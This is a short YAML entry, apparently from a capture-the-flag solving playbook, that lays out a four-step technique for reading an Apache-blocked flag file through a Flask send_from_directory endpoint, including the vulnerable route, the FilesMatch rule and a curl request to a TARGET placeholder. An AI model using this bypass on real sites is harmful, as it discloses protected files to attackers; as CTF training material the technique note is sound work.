name: lfi_static_resource_flask
category: web
tags: [lfi, information_disclosure, flask, send_from_directory, apache_bypass]
indicators:
  - "Flask app uses send_from_directory"
  - "Apache config blocks direct access to some files"
  - "Exists /resource or similar file read endpoint"
  - "Hint: flag is a static resource"

tricks:
  - name: "Step 1: Identify file read endpoint"
    when: "Analyze source code"
    how: "/resource endpoint uses send_from_directory to read static files"
    payload: |
      @route('/resource')
      def resource():
          filename = request.args.get('filename')
          return send_from_directory('static', filename)

  - name: "Step 2: Analyze Apache config"
    when: "Direct access to /static/flag denied"
    how: "Apache FilesMatch rule blocks direct access to flag file"
    payload: |
      <FilesMatch "^flag$">
          Order allow,deny
          deny from all
      </FilesMatch>

  - name: "Step 3: Bypass Apache restriction"
    when: "Need to read blocked file"
    how: "Read via Flask send_from_directory, bypasses Apache FilesMatch"
    payload: |
      /resource?filename=flag

  - name: "Step 4: Extract the flag"
    when: "Execute attack"
    how: "GET request to /resource with filename=flag"
    payload: |
      curl "http://TARGET/resource?filename=flag"
